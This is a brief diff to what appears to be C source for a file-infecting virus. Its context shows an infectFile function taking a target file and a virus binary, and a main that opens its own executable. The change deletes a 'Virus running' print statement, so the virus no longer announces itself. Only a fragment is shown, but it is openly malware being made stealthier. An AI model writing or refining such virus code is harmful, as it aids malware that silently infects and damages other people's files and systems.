@@ -200,8 +200,6 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
  * Main function
  */
 int main(int argc, char *argv[]) {
-    printf("Virus running\n");
-
     // Open own binary
     FILE *ownBin = fopen(argv[0], "rb");
     if (ownBin == NULL) {
